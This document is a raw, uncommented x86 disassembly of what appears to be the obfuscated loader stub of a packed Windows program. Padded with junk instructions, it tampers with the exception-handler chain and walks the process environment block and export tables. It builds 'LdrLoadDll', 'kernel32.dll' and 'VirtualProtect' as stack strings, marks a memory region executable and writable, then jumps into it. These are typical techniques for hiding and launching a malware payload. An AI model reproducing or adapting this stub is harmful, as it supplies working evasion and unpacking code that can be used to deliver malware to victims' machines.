_start
pushad
add esp 0xfffffffc
mov [ esp ] ebx
xor ebx [ esp ]
sub esp 0xfffffffc
push esp
test eax eax
adc ebx 0x1
add esp 0x4
mov edx [ esp - 0x4 ]
inc ebx
sub edx 0x4
inc ebx
neg ebx
call $+5
sub [ edx ] ebx
retn
sub_69402035
push 0x0
pop edx
xor ecx ecx
add ecx edx
mov eax 0x0
or eax edx
add cl 0xff
add cl 0xff
mov ch cl
call $+5
and edi edi
sbb eax 0xffffffff
test ebx ebx
mov esi 0x0
adc esi [ esp ]
movzx ebx [ esi + eax - 0x2 ]
call $+5
mov [ esp ] ecx
sub ecx ebx
pop ecx
jne r-xdata
add [ esp ] edx
jmp [ esp ]
and edx 0x0
add edx eax
sub_694020bf
push [ fs : 0x0 ]
add eax edx
push 0xffff
pop ecx
not edi
add eax edx
mov [ fs : 0x0 ] esp
and eax edi
test eax eax
adc eax edx
jmp r-xdata
call $+5
mov ebx [ esp ]
add esp 0x4
xor ebx ebx
xor ebx [ esp ]
mov [ fs : 0x0 ] ebx
add esp 0x8
sub edx edx
add edx eax
push [ eax + 0x3c ]
pop ebx
add eax ebx
xor ebx ebx
or ebx 0x4550
mov esi 0x0
sub esi [ eax ]
neg esi
call $+5
mov [ esp ] ebx
xor ebx esi
pop ebx
jne r-xdata
jmp [ esp ]
popad
sub eax eax
add eax 0x1
retn 0xc
mov ebx 0x0
or ebx [ eax + 0x78 ]
mov eax 0x0
xor eax ebx
or eax eax
adc eax edx
push eax
and ebx 0x0
or ebx [ eax + 0x20 ]
push ebx
pop eax
or ecx ecx
adc eax edx
add esp 0xfffffffc
mov [ esp ] edx
add esp 0xfffffffc
mov [ esp ] eax
add esp 0x4
mov esi [ esp - 0x4 ]
add esp 0x4
mov ebx [ esp - 0x4 ]
add esp 0xfffffffc
mov [ esp ] edx
xor edx [ esp ]
and ecx ecx
sbb esp 0xfffffffc
xor eax eax
add eax esi
and ecx 0x0
add ecx [ esi ]
mov esi 0x0
add esi ecx
call $+5
and ebp 0x0
add ebp esp
add esi ebx
add esp 0xfffffffc
mov [ esp ] 0x6c6c
add esp 0xfffffffc
mov [ esp ] 0x4464616f
add esp 0xfffffffc
mov [ esp ] 0x4c72644c
sub edi edi
add edi esp
and ecx ecx
mov ecx 0x0
adc ecx 0xb
[ esi ] [ edi ]
je r-xdata
test ebx ebx
sbb eax edx
push ebx
xor ebx [ esp ]
add esp 0x4
mov ebx [ eax ]
and esi 0x0
add esi 0x5a4d
and ebx ecx
add esp 0xfffffffc
mov [ esp ] ebx
xor ebx esi
pop ebx
je r-xdata
xor esp esp
add esp ebp
add esp 0x4
mov esi [ esp - 0x4 ]
add esp 0xfffffffc
mov [ esp ] ebx
push edx
mov edi [ esp ]
add esp 0x4
add esp 0x4
mov edx [ esp - 0x4 ]
pop eax
mov ecx 0x0
xor ecx eax
sub ebx ebx
add ebx [ eax + 0x24 ]
and eax 0x0
or eax ebx
add eax edx
xor ebx ebx
add ebx [ eax + edi * 2 ]
and ebx 0xffff
xor edi edi
xor edi ebx
mov ebx 0x0
add ebx [ ecx + 0x10 ]
sub edi ebx
or eax eax
sbb edi 0xffffffff
xor eax eax
add eax [ ecx + 0x1c ]
test edi edi
adc eax edx
mov ebx 0x0
or ebx [ eax + edi * 4 ]
or edi edi
adc edx ebx
xor ebp ebp
or ebp esp
sub esp 0x4
mov [ esp ] ebx
xor ebx [ esp ]
or ecx ecx
sbb esp 0xfffffffc
add esp 0xfffffffc
mov [ esp ] ebx
xor eax eax
or eax esp
sub esp 0x4
mov [ esp ] ebx
push 0x6c006c
add esp 0xfffffffc
mov [ esp ] 0x64002e
sub esp 0x4
mov [ esp ] 0x320033
call $+5
mov [ esp ] 0x6c0065
push 0x6e0072
sub esp 0x4
mov [ esp ] 0x65006b
push esp
sub esp 0x4
mov [ esp ] 0x1a0018
mov esi 0x0
sub esi esp
neg esi
add esp 0xfffffffc
mov [ esp ] eax
call $+5
mov [ esp ] esi
call $+5
mov [ esp ] ebx
sub esp 0x4
mov [ esp ] ebx
call $+5
mov [ esp ] edx
sub esp 0x4
mov [ esp ] eax
add esp 0x4
mov esi [ esp - 0x4 ]
add esp 0x4
mov ebx [ esp - 0x4 ]
call ebx
xor eax eax
xor eax [ esi ]
sub esp 0x4
mov [ esp ] eax
pop ebx
mov esi 0x0
or esi [ fs : 0x30 ]
and edx edx
mov edx 0x0
adc edx [ esi + 0x10 ]
mov [ edx + 0x18 ] ebx
and esp 0x0
or esp ebp
mov esi 0x0
add esi [ fs : 0x30 ]
mov edx 0x0
sub edx [ esi + 0x10 ]
neg edx
mov eax 0x0
add eax [ edx + 0x18 ]
mov edx 0x0
xor edx eax
and ebx 0x0
or ebx [ eax + 0x3c ]
add eax ebx
mov ebx 0x0
xor ebx [ eax + 0x78 ]
mov eax 0x0
xor eax ebx
or ebx ebx
adc eax edx
push eax
xor ebx ebx
xor ebx [ eax + 0x20 ]
xor eax eax
xor eax ebx
and edx edx
adc eax edx
push edx
call $+5
mov [ esp ] eax
mov esi [ esp ]
add esp 0x4
mov ebx [ esp ]
add esp 0x4
xor edx edx
test ebx ebx
mov eax 0x0
adc eax esi
mov ecx 0x0
or ecx [ esi ]
and esi 0x0
add esi ecx
call $+5
test eax eax
mov ebp 0x0
adc ebp esp
add esi ebx
add esp 0xfffffffc
mov [ esp ] 0x7463
add esp 0xfffffffc
mov [ esp ] 0x65746f72
sub esp 0x4
mov [ esp ] 0x506c6175
sub esp 0x4
mov [ esp ] 0x74726956
xor edi edi
or edi esp
and ecx 0x0
or ecx 0xf
[ esi ] [ edi ]
je r-xdata
or edx edx
sbb edx 0xffffffff
add eax 0x4
mov esi 0x0
or esi [ eax ]
and esp 0x0
or esp ebp
jmp [ esp ]
sub esp esp
add esp ebp
pop esi
add esp 0xfffffffc
mov [ esp ] ebx
sub esp 0x4
mov [ esp ] edx
pop edi
add esp 0x4
mov edx [ esp - 0x4 ]
add esp 0x4
mov eax [ esp - 0x4 ]
mov ecx 0x0
add ecx eax
xor ebx ebx
or ebx [ eax + 0x24 ]
mov eax ebx
add eax edx
and ebx 0x0
add ebx [ eax + edi * 2 ]
and ebx 0xffff
sub edi edi
add edi ebx
xor ebx ebx
add ebx [ ecx + 0x10 ]
or eax eax
sbb edi ebx
and eax eax
sbb edi 0xffffffff
and eax 0x0
add eax [ ecx + 0x1c ]
and edi edi
adc eax edx
or ebx ebx
mov ebx 0x0
adc ebx [ eax + edi * 4 ]
and edi edi
adc edx ebx
xor ecx ecx
or ecx 0x1000
call $+5
add esp 0x4
mov eax [ esp - 0x4 ]
and eax 0xfffff000
and ecx ecx
adc eax ecx
and ebx ebx
adc eax ecx
call $+5
mov [ esp ] eax
mov esi 0x0
or esi 0x4
call $+5
test edx edx
adc eax ecx
mov ebx 0x0
sub ebx [ eax ]
neg ebx
sub esi 0x1
je r-xdata
sub edx 0xffffffff
add eax 0x4
mov esi 0x0
add esi [ eax ]
mov esp 0x0
add esp ebp
jmp [ esp ]
add esp 0x4
mov ebx [ esp - 0x4 ]
mov eax [ esp ]
add esp 0x4
push ebx
push esp
add esp 0xfffffffc
mov [ esp ] 0x40
add esp 0xfffffffc
mov [ esp ] 0x45c0
add esp 0xfffffffc
mov [ esp ] eax
push edx
add esp 0xfffffffc
mov [ esp ] eax
mov esi [ esp ]
add esp 0x4
pop ebx
call $+5
pop eax
test eax eax
adc eax 0x1d
call $+5
mov [ esp ] eax
add esp 0xfffffffc
mov [ esp ] ebp
xor ebp ebp
add ebp esp
add ebx 0x5
jmp ebx
jmp [ esp ]
